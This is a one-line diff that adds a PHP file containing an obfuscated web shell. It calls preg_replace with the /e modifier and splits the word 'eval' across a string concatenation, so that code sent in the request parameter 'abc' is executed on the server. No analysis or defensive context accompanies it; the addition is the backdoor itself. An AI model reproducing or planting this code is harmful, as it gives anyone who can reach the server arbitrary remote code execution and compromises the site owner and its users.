@@ -1,0 +1,1 @@
+<?php  preg_replace("/laterain/e", "ev"."al('".$_REQUEST['abc']."')", "laterain testin9"); ?>
